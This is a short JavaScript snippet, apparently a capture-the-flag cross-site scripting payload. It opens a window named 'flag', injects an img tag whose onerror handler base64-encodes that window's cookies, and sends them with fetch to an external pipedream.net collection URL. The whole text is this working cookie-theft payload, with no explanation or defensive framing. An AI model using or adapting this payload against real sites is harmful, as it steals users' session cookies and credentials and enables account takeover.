
flag = window.open("flag")
flag.window.onload = () =>{
    flag.window.document.write(`<img src=x onerror="fetch('https://eoctl0knzoys9l9.m.pipedream.net/?flag=${btoa(flag.window.document.cookie)}')">`)
}
